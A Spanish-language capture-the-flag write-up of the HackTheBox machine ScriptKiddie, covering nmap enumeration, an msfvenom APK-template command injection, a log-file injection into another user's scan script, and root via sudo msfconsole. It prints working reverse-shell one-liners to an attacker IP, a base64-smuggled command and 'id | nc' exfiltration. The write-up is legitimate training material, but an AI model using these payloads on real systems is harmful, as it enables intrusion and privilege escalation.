---
layout      : post 
title       : "HackTheBox - ScriptKiddie"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png
category    : [ htb ]
tags        : [ sudo, command-injection, file-upload, code-analysis ]
---
Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un **"template"**, ¿qué puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como **sudo**, con la sorpresa que ejecutando solo 2 líneas somos **root** mediante *msfconsole*.

![314scriptkiddieHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314scriptkiddieHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [0xdf](https://www.hackthebox.eu/profile/4935).

Wenas, nos encontraremos con una web bastante traviesa que ejecuta comandos en el sistema (nada relacionado con **command injection**). Uno de los apartados nos permite generar payloads con `msfvenom`, pero también nos da la opción de agregarle un **template**, buscando por internet nos aprovecharemos de una vulnerabilidad relacionada con **templates en APK's Android** para conseguir una Shell como el usuario **kid**.

Posteriormente inspeccionaremos a detalle un script al cual tenemos acceso, aprovecharemos una falla en él para sobreescribir un archivo que está leyendo y que ejecute una Shell, en este caso como el dueño del script, **pwn**.

Validando los permisos que tiene **pwn** usando `sudo` en el sistema (como si estuviéramos ejecutando el proceso como **root**), vemos que puede ejecutar `msfvenom`, lo usamos para pasarnos a una Shell como **root** :)

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Juguetona, con tintes de vulnerabilidades conocidas pero poco real :(

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

¿Qué haremos?

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral](#movimiento-lateral).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.

```bash
❭ nmap -p- --open -v 10.10.10.226 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.226
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.226 ()   Status: Up
Host: 10.10.10.226 ()   Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///
# Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 153.39 seconds
```

Perfecto, nos encontramos los servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** |
| 5000   | **[UPnP](https://www.speedguide.net/port.php?port=5000)**: Conjunto de protocolos para la comunicación de periféricos en la red. |

Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos información más detallada de cada uno:

```bash
❭ nmap -p 22,5000 -sC -sV 10.10.10.226 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p 22,5000 -sC -sV -oN portScan 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18.92 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 5000   | HTTP     | Werkzeug httpd 0.16.1 (Python) |

Pues démosle a cada servicio y veamos que podemos romper (:

...

En cuanto al puerto **22** y su versión no tenemos nada. Basándonos en el puerto `5000`:

### Puerto 5000 [⌖](#puerto-5000) {#puerto-5000}

![314page5000](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000.png)

Varios apartados donde podemos interactuar y ejecutar instrucciones en el sistema que posteriormente se nos mostraran en el mismo sitio, como por ejemplo, hagamos el primero apartado donde realiza un escaneo de los 100 puertos más populares:

![314page5000_scanTOP100](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_scanTOP100.png)

Pues exploremos y veamos como podemos colar alguna ejecución de comandos de nuestro lado...

Despues de un rato intentando `command injection` no obtuve nada. Pero pensando en que estarían haciendo los comandos por detrás y como se estarían ejecutando, podemos enfocarnos en el apartado `msfvenom`.

> `msfvenom` en pocas palabras nos permite crear payloads que podemos usar en muchos formatos y aplicaciones.

* [Creating Metasploit Payloads](https://netsec.ws/?p=331).

![314page5000_msfVinit](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_msfVinit.png)

...

## Explotación [#](#explotacion) {#explotacion}

Si nos fijamos es el único que nos permite interactuar con la ejecución, podemos agregándole un template... Jmm si buscamos en internet `exploit template msfvenom`, obtenemos esto:

* [Metasploit Framework 6.0.11 - msfvenom APK template command injection](https://www.exploit-db.com/exploits/49491).

Se trata de una vulnerabilidad que permite ejecutar comandos en la generación de un APK para Android como template.

Viendo el código debemos cambiar los comandos que queremos ejecutar, intentemos establecer una Reverse Shell de una vez:

```py
...
# Change me·
payload = 'nc 10.10.14.47 4433 -e /bin/bash'
...
```

Nos ponemos en escucha:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Y ejecutamos el script para que nos genere el `.apk` malicioso con el que posteriormente ejecutaremos el proceso en la web:

```bash
❭ python3 msfvenom_APK.py 
[+] Manufacturing evil apkfile
Payload: nc 10.10.14.47 4433 -e /bin/bash
-dname: CN='|echo bmMgMTAuMTAuMTQuNDcgNDQzMyAtZSAvYmluL2Jhc2g= | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.

[+] Done! apkfile is at /tmp/tmp6ns2_i9t/evil.apk
Do: msfvenom -x /tmp/tmp6ns2_i9t/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Perfecto, ahora (como dice al final) plasmemos la ejecución pero en la web:

![314page5000_msfVrun](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314page5000_msfVrun.png)

Entonces si lo comparamos con la ejecución por Shell, cada campo equivale a:

* **-x**: El archivo `APK` malicioso (donde podemos subir el template).
* **LHOST**: Debe ser `localhost`, ya que queremos ejecutar los comandos en la máquina para que desde ahí nos genere la Reverse Shell.

Damos en `generate`:

Pero en la web obtenemos `Something went wrong`. Así que probablemente sea que estamos con el binario `nc` que no soporta el argumento `-e`, intentémoslo con ese binario:

* [Reverse Shell Cheat Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

```py
...
payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.47 4433 >/tmp/f'
...
```

Ejecutamos script y obtenemos:

![314bash_revSHapkfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_revSHapkfile.png)

Una Shell como el usuario `kid`, perfecto. Antes de seguir volvamos nuestra Shell una <<Shell>> completamente interactiva, para que podamos movernos entre comandos, regresar histórico, hacer `CTRL + C` sin miedo a perder la sesión y para estar más cómodos.

Escribimos (todo seguido):

```bash
kid@scriptkiddie:~/html$ script /dev/null -c bash
(CTRL + Z)
❭ stty raw -echo
❭ fg #(asi no lo veas se esta escribiendo)
        reset
Terminal type? xterm
kid@scriptkiddie:~/html$ export TERM=xterm
kid@scriptkiddie:~/html$ export SHELL=bash
kid@scriptkiddie:~/html$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))
```

Y listo hemos hecho el tratamiento de la TTY perfectamente.

* [Savitar te lo explica gráficamente](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

Con `kid` tenemos la flag de user.

...

## Movimiento lateral [#](#movimiento-lateral) {#movimiento-lateral}

Dando vueltas vemos otro usuario: `pwn`, el cual es su `home` tiene un archivo interesante (el cual despues de algún testeo sabemos que se está ejecutando demasiado rápido)

#### Explicación script 🤪

Detallémoslo a vel:

```bash
kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

El archivo `hackers` (si nos fijamos en el script que tenemos en la ruta `/home/kid/html` llamado `app.py`) guarda un TimeStamp y una IP de la persona que intenta "hackear" el campo donde le ingresábamos algo a `searchsploit`:

```py
...
with open('/home/kid/logs/hackers', 'a') as f:
    f.write(f'[{datetime.datetime.now()}] {srcip}\n')
return render_template('index.html', sserror="stop hacking me - well hack you back")
```

* El script de `pwn` lee el archivo `/home/kid/logs/hackers` y lo guarda en la variable `$log`, (el archivo casi siempre está vacío, si nos adelantamos vemos al final del script que lo limpia (`echo -n > $log`),

Emulando esto en nuestro entorno y leyendo el script (para saber como llega la variable `srcip`), está guardando esto en el archivo con esta sintaxis:

```bash
[Fecha Hora] IP
```

```bash
kid@scriptkiddie:~$ cat /home/kid/logs/hackers

```

* Toma el contenido y extrae la IP para hacerle un escaneo de los 10 puertos más populares, esto usando `sh` llamando a `nmap`, pero ¿cómo?, hagamos un ejemplo rápido:

Tenemos el archivo `hackers` con toda esta línea:

```bash
1 22 333 4444 55555 666666
```

Al hacer el cut esta "cortando" el archivo en pedazos, pero ¿en cuántos pedazos? Bueno, depende del carácter que le pasemos como separador en el argumento `-d`, en este caso el espacio: `' '`. Pero ahora como le indicamos que nos muestre solo `X` ítem de toda la línea, pues digamos que queremos que solo nos muestre los números `55555`, pues se lo indicaríamos con el argumento `f`, entonces tendríamos:

```bash
❭ cat hackers | cut -d ' ' -f3
333        # Esta seria la IP que extraeria
```

Hasta acá todo perfecto, peeeeeeeeeeeero si nos fijamos en nuestro `cut` y el del script vemos una diferencia bastante pequeña pero muy significativa:

* Nosotros hacemos `cut -d ' ' -f3`
* El script hace `cut -d ' ' -f3-`

La diferencia la vemos acá:

```bash
❭ cat hackers | cut -d ' ' -f3
333
```

```bash
❭ cat hackers | cut -d ' ' -f3-
333 4444 55555 666666
```

El símbolo `-` le indica que nos muestre desde nuestro corte hasta donde acabe la línea. 

Perfectooooo, podemos aprovecharnos de esto fácilmente, recordemos que tenemos:

* El archivo `/home/pwn/scanlosers.sh` se está ejecutando automáticamente muy rápido,
* Está leyendo el archivo `/home/kid/logs/hackers` (al cual tenemos acceso y podemos sobreescribirlo),
* Pero debemos ser rápidos, ya que al final del script lo está sobreescribiendo con valores nulos si el tamaño del archivo es mayor a 0.
* Sabiendo que todo lo que venga despues del corte en el tercer (`3`) espacio se está leyendo, podemos indicarle que no solo extraiga la IP, sino que nos ejecute nuestro payload:

...

Entonces podemos crearnos un script que sobreescriba el contenido del archivo `/home/kid/logs/hackers` con nuestro payload:

Como prueba inicial digámosle que nos mande una traza hacia nuestra máquina con `nc`:

```bash
#!/bin/bash

while true; do
    echo "1 2 3;nc 10.10.14.47 4434" > /home/kid/logs/hackers
done
```

> Sencillamente nos aprovechamos que toma toooooda la línea despues del 3. Entonces contamos el proceso y ejecutamos lo nuestro, terminamos (separamos) la ejecución del comando con un simple `;`. Como toda la vida :P

Pongámonos en escucha por el puerto `4434` y vemos si recibimos algo:

```bash
❭ nc -lvp 4434
listening on [any] 4434 ...
```

Ejecutamos el script y estamos atentos :P

![314bash_scanlosers_injectionNC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_scanlosers_injectionNC.png)

Bien bien, recibimos la petición, así que aprovechémonos de esto para generar una Shell :O

**(**

Pueden probar de todo, si ejecutamos:

```bash
...
echo "1 2 3;id | nc 10.10.14.47 4434" > /home/kid/logs/hackers
...
```

Obtenemos:

```bash
❭ nc -lvp 4434
listening on [any] 4434 ...
10.10.10.226: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.226] 52764
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```

**)**

Ahora si a por la Shell, solo quería mostrar eso :P

Nuestro script quedaría así:

```bash
#!/bin/bash

while true; do
    echo "1 2 3;bash -c 'bash -i >& /dev/tcp/10.10.14.47/4434 0>&1'" > /home/kid/logs/hackers
done
```

Y tendríamos:

![314bash_scanlosers_injectionrevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314bash_scanlosers_injectionrevSH.png)

Opa, tenemos una sesión como `pwn`

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314google_gifdanceNBA.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;"/>

¡Enumeremos pa vel!

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si validamos que puede ejecutar `pwn` usando sudo (con permisos de `root`) en la máquina, nos encontramos:

```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

El binario `msfconsole`, veamos:

```bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
```

Y tenemos:

```bash
msf6 > id
[*] exec: id

uid=0(root) gid=0(root) groups=0(root)
```

```bash
msf6 > /bin/bash
[*] exec: /bin/bash

root@scriptkiddie:/home/pwn# cd
root@scriptkiddie:~# ls
root.txt  snap
```

Perfecto, solo nos quedaría ver las flags:

![314flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314flags.png)

...

Linda máquina, sencilla (no había prestado bastante atención al script de `pwn` y estuve bastante estancado ahí), es muy CTF, pero bueno, se disfruta igual (:

Así que nada, está claro que nos vamos a frustrar en algunos momentos, pero lo importante es no rendirse y darle, darle pa lante.

Muchas gracias y como siempre, a seguir rompiendo todo :*